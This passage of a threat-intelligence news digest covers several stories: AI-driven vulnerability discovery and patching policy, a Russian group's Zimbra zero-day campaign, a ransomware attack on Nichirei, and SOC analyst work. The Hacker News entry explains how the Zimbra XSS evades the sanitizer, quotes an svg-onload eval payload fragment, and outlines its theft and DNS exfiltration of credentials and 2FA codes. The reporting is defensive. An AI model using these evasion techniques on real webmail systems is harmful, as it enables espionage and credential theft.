- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government, critical_infrastructure
- affected_products: Linux kernel, Anthropic/Claude
- tools_used: Palo Alto Networks
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
You cannot out-patch a machine that writes a working exploit from a vulnerability description in twenty hours. Stop trying to optimize a game you cannot win. The post Is Patching Dead? Vulnerability Management in the Post-Mythos Era appeared first on SecurityWeek .
```

#### Full body

```
On July 14, 2026, the White House launched Gold Eagle : a federal clearinghouse that uses frontier AI to identify, rank, and coordinate the remediation of software vulnerabilities across government and critical infrastructure before attackers reach them. Bringing together the Treasury, DHS, DoD, open-source software partners, and operators of American critical infrastructure, Gold Eagle’s engine relies on frontier AI—including Anthropic’s Mythos, the same class of system that surfaced critical flaws inside classified U.S. government software during testing. A government harnessing advanced AI to hunt vulnerabilities is conceding something fundamental: the two-decade model of humans finding and patching vulnerabilities one at a time has stopped keeping pace. Gold Eagle is the national-scale response. The harder question is: what is required inside your own walls? What Changed Mythos is a frontier AI model that surfaces vulnerabilities no prior tool could—from a 27-year-old remote crash in OpenBSD to chained Linux kernel flaws escalating to full system control without human guidance. Anthropic’s roughly 50 Project Glasswing partners have uncovered more than 10,000 high- or critical-severity vulnerabilities in essential software. That capability would be manageable if it stayed with defenders. It did not. In June 2026, Anthropic released Fable to the public; its access was briefly suspended under US export controls that month before being restored, a signal that frontier vulnerability discovery is now treated as controlled technology, closer to a munition than a SaaS release. Look at the operational timelines we face: Advertisement. Scroll to continue reading. Attacker Speed: In March 2026, Sysdig researchers observed threat actors exploiting a CVE within 20 hours of release without a public proof-of-concept (PoC), weaponizing it from the description alone. Mandiant’s M-Trends 2026 report puts the estimated Mean Time to Exploit (MTTE) at negative seven days —meaning exploits now routinely precede public disclosures. Defender Lag: The Verizon 2026 Data Breach Investigations Report puts the median time to fix a known-exploited flaw at 43 days (up from 32 the year prior), with only 26% of vulnerabilities ever fully patched. Extreme Volume: The Forum of Incident Response and Security Teams (FIRST) projects roughly 59,000 new CVEs in 2026 —over 160 per day—with Remote Code Execution (RCE) flaws up 130% from last year. The legacy CVE program was simply not designed for this volume or velocity. Five Ways The Industry Is Responding Rethink the patching process. Cisco overhauled its CVE process after recognizing that assessing risk one flaw at a time is unsustainable, shifting to a risk-based disclosure model with umbrella common-weakness categories and a twice-monthly release schedule. The government reached the same conclusion: in June 2026, CISA’s Binding Operational Directive 26-04 revoked BOD 22-01 (which mandated strict patching deadlines for everything on the KEV catalog). Under BOD 26-04, KEV status is now just one of four variables , evaluated alongside: Public asset exposure Automated exploitability Technical impact (partial vs. total control) We’re moving from patch-everything-on-a-deadline to prioritize-by-realized-risk . As Wendi Whitmore, Chief Security Intelligence Officer at Palo Alto Networks, frames it for boardrooms: “If a vulnerability is published tomorrow with weaponized AI-generated exploit code attached, what is your committed timeline to patch, and who has the authority to invoke it without escalation?” Reduce the exposure. You cannot patch — or defend — what you cannot see. Discovering assets and mapping your attack surface across internet-facing services, legacy hosts, and shadow deployments remains a foundational step. However, in the AI era, exposure management goes beyond open ports; it requires constraining what autonomous agents and non-human identities are permitted to do. The July 2026 breach of Hugging F
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Is Patching Dead? Vulnerability Management in the Post-Mythos Era
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.securityweek.com/is-patching-dead-vulnerability-management-in-the-post-mythos-era/
  - Summary: You cannot out-patch a machine that writes a working exploit from a vulnerability description in twenty hours. Stop trying to optimize a game you cannot win. The post Is Patching Dead? Vulnerability Management in the Post-Mythos Era appeared first on SecurityWeek .

### Cluster 02b144b02f — score 8

- Title: Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-07-23T17:33:37+00:00
- Link: https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: critical_infrastructure, education, financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- affected_industries: financial_services, government, critical_infrastructure, education
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Laundry Bear exploited a zero-day vulnerability for five months before it was patched in November 2025, and the group is still actively exploiting vulnerable environments. The post Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries appeared first on CyberScoop .
```

#### Full body

```
Advertisement Subscribe to our daily newsletter. Subscribe Close A Russian state-sponsored threat group has been stealing sensitive data from governments and commercial organizations since July 2025 via a novel exploit in popular Linux-based enterprise software, U.S. authorities and cyber officials from more than a dozen other countries warned in a joint cybersecurity advisory Thursday. Laundry Bear’s most recent espionage campaign involves the exploitation of a zero-day vulnerability in Zimbra Collaboration Suite that wasn’t patched until November 2025, five months after attacks were well underway, officials said. The exploit just requires a view — no clicks — and allows attackers to steal the previous 90 days’ worth of email, the account’s password, search history, the victim organization’s email directory, two-factor authentication tokens and other newly created passwords. “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” officials wrote in the advisory. Advertisement “Additionally, extensive Ukrainian targeting, prior to use against U.S. and other NATO allies, outlines an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” The state-sponsored espionage group, also known as Void Blizzard, has compromised governments and organizations in the defense, education, energy, law enforcement, media, finance, transportation and technology sectors. Laundry Bear’s year-long campaign involving the exploitation of CVE-2025-66376 showcases more technical capabilities, including a custom JavaScript payload it delivers to targeted victims via phishing emails. The threat group could also likely adapt the novel data exfiltration and aggregation capability, dubbed “beehive,” to exploit other vulnerabilities, officials warned. The defect’s medium-severity rating of 6.1 underscores the challenge defenders regularly confront in prioritizing patching schedules based on measure of severity alone. The Russian state-supported group, which has been active since at least 2024, is still actively exploiting Zimbra Collaboration Suite instances that remain unpatched, officials said. Advertisement Authorities shared Thursday indicators of compromise, mitigation steps and urged organizations to update their vulnerable software. “This campaign’s targeted victimology and limited exploitation capabilities likely indicate this group manually identifies and targets the victim organizations” by identifying organizations with public-facing infrastructure, officials wrote in the advisory. Once a target is identified, Laundry Bear also likely compiles email addresses for users to target with the exploit via phishing emails. Officials did not identify specific victims or describe the volume of organizations already compromised. The joint cybersecurity advisory was issued by the United States, Australia, Canada, New Zealand, the United Kingdom, Czech Republic, Denmark, Estonia, Finland, France, Italy, Moldova, the Netherlands, Poland, Spain and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Gwengoat, iStock/Getty Images Plus (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity A builder’s view of the AI arms race What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Government ANCHOR-CI could fix 20 years of broken government-industry collaboration Most federal cybersecurity reporting rules are duplicative, study finds White House accuses Chinese company of distilling Anthropic’s Fable AI models keep getting caught cheating Technology OpenAI says m
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries
  - Published: 2026-07-23T17:33:37+00:00
  - Link: https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
  - Summary: Laundry Bear exploited a zero-day vulnerability for five months before it was patched in November 2025, and the group is still actively exploiting vulnerable environments. The post Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries appeared first on CyberScoop .

### Cluster b849eebcfc — score 8

- Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T01:00:00+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.
```

#### Full body

```
Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. "We are proceeding with business recovery after implementing security measures in collaboration with an external security firm," the company said in a July 22 Japanese-language statement (translated via Kagi Translate). "Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week." Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. "Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply," he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. "Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks," he says, adding: "Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
  - Published: 2026-07-23T01:00:00+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
  - Summary: A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.

### Cluster 6490abfb48 — score 8

- Title: The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success
- Source: Black Hills Information Security (detection_response_operations)
- Published: 2026-07-22T14:00:00+00:00
- Link: https://www.blackhillsinfosec.com/life-of-a-soc-analyst/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Security Operations Centers (SOCs) serve as a critical line of defense against today's constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. The post The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success appeared first on Black Hills Information Security, Inc. .
```

#### Full body

```
22 Jul 2026 Active SOC , Blue Team , Incident Response , Informational , InfoSec 101 , SOC Blue Book , Infosec for Beginners , InfoSec Survival Guide , Tom DeJong The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success | Tom DeJong This article was originally published in the InfoSec Survival Guide: Blue Book — SOC Analysts. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security Operations Centers (SOCs) serve as a critical line of defense against today’s constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. Being a SOC analyst is far more than just “investigating alerts.” It’s a high-pressure balancing act that requires triage, incident response, continuous tuning, and collaboration, all while adapting to an ever-changing threat landscape. Core Responsibilities A SOC analyst’s shift typically begins with reviewing any changeover notes made by the previous team. You should also review active incidents, escalations, or any other tasks requiring follow-up. Alert Triage Analysts spend much of their time responding to alerts from tools like SIEM and EDR. Each alert must be reviewed and classified as a true positive, benign activity (false positive), or something needing deeper investigation. Proper triage also involves prioritization based on impact, severity, and asset criticality, and documenting the steps taken and decisions made. Accurate triage sets the foundation for effective response. Incident Response Once an alert is confirmed as a true threat (“true positive”), analysts shift into incident response (IR) mode. This includes isolating affected systems, investigating root causes, documenting Indicators of Compromise (IOCs), and coordinating with IT teams for remediation. Timely and accurate responses can be the difference between minor incidents and major breaches. Tuning and Detection Improvements To remain effective, SOCs must constantly tune out benign behavior (“false positives”) and improve detection logic. This involves refining SIEM rules, suppressing noisy alerts, and creating new detections based on emerging threats. Without proper tuning, analysts risk missing real threats buried in the alert noise. Tuning is essential to making the SOC more resilient and efficient. Collaboration and Documentation SOC analysts frequently collaborate with other teams such as IT, compliance, and engineering. To support this collaboration, it’s essential for analysts to produce clear and thorough documentation. Good documentation tells the full story of an investigation and helps others understand the analyst’s reasoning and the steps taken. A helpful mindset is to write with a new hire in mind: Would they be able to follow your notes, understand your conclusions, and reproduce your findings? Effective communication and documentation are critical for maintaining operational continuity and promoting knowledge sharing across the organization. Daily Challenges Alert Fatigue With numerous log sources feeding into SOC tools, analysts face a flood of alerts. Many of the alerts will be false positives. Investigating these repetitive, low-value events can lead to mental fatigue and mistakes. This is where proper tuning, automation, and risk-based alerting become essential in reducing the noise and focusing on what really matters. Time Pressure & Task Juggling Balancing triage, investigations, tuning, internal projects, and training can be overwhelming. Priorities shift constantly, requiring frequent context-switching. Without structured time management, long-term improvements will be delayed. Blocking off time for projects and professional development is critical to avoid stagnation. Keeping Skills Current Security threats evolve rapidly, and analysts must stay up-to-date on vulnerabilities, attack techniques, and changes in
```

#### Corroborating sources (1)

- **Black Hills Information Security** (detection_response_operations)
  - Title: The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success
  - Published: 2026-07-22T14:00:00+00:00
  - Link: https://www.blackhillsinfosec.com/life-of-a-soc-analyst/
  - Summary: Security Operations Centers (SOCs) serve as a critical line of defense against today's constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. The post The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success appeared first on Black Hills Information Security, Inc. .

### Cluster 76e10c02ae — score 8

- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-23T18:36:08+00:00
- Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
```

#### Full body

```
Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes  Swati Khandelwal  Jul 23, 2026 Email Security / Vulnerability A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA , CISA and partner agencies published a joint advisory on the campaign Thursday, alongside research from Palo Alto Networks' Unit 42 and Proofpoint. The advisory calls the technique "a view-based exploit that only requires a user to view a malicious email" in a vulnerable client. It says the actors have been targeting and compromising Western government and commercial organizations through Zimbra since at least July 2025. The flaw, CVE-2025-66376 , is a stored cross-site scripting vulnerability in Zimbra's Classic UI. A crafted HTML email abuses CSS @import handling to execute JavaScript inside an authenticated webmail session, so the payload inherits the user's access to the mailbox. The two CVSS records disagree on whether viewing the message counts as user interaction: NVD scores it 6.1 and says it does; MITRE scores it 7.2 and says it does not. Unit 42 calls it zero-click. All three describe the same behavior: the message runs when it renders, and nothing else has to happen. It affects Zimbra Collaboration 10.0 before 10.0.18 and 10.1 before 10.1.13 . Zimbra fixed it on November 6, 2025, and CISA added it to the Known Exploited Vulnerabilities catalog on March 18, 2026. Proofpoint , which tracks the actor as TA488, said the group exploited the bug as an unknown vulnerability for at least five months during 2025, before that fix existed. The patch closes the hole, not the account. An update does not revoke credentials the payload already took. Proofpoint said the messages went out from adversary-controlled Proton Mail accounts and from previously compromised addresses, using generic lures. Unit 42 , which tracks the activity as CL-STA-1114, said they were often dressed as a digest of current news. The exploit sits in the HTML body. It hides an svg onload tag inside a display:none div, then breaks the tag apart with fake @import directives and HTML comments, a technique Proofpoint calls tag-splitting. Zimbra's sanitizer does not recognize the fragments as executable markup. It strips the @import sequences, and the characters left behind join into <svg onload=eval(atob(...))> , which the browser runs. Proofpoint tracks the JavaScript payload as ZimReaper. It steals the CSRF token and the browser's autofilled password, pulls 2FA scratch codes and Zimbra version details through the platform's own APIs, and exfiltrates them over DNS queries to actor infrastructure. Then it brute-forces the Global Address List, querying every two-character combination until the whole list comes back, and posts 90 days of the victim's mail to the C2 as a TGZ archive. Unit 42 counted at least nine C2 IP addresses and nine domains, each server live for an average of 35.4 days. It named no affected organizations and gave no victim count. Its list of sectors and regions describes who was targeted. It does not say who was compromised. That list runs across government, defense, transportation and financial organizations in NATO member states, Ukraine, the Commonwealth of Independent States and Africa. Proofpoint puts US organizations on it too: government, scientific and defense industrial base entities, including nuclear installations. The payload mints an app-specific password named ZimbraWeb through CreateAppSpecificPasswordRequest , which can grant IMAP, POP3 or SMTP access without two-factor authentication. Proofpoint said TA488 went on to send further exploit emails from compromised mailservers, and could not say whether the app passwords or other stolen
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
  - Published: 2026-07-23T18:36:08+00:00
  - Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
  - Summary: A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
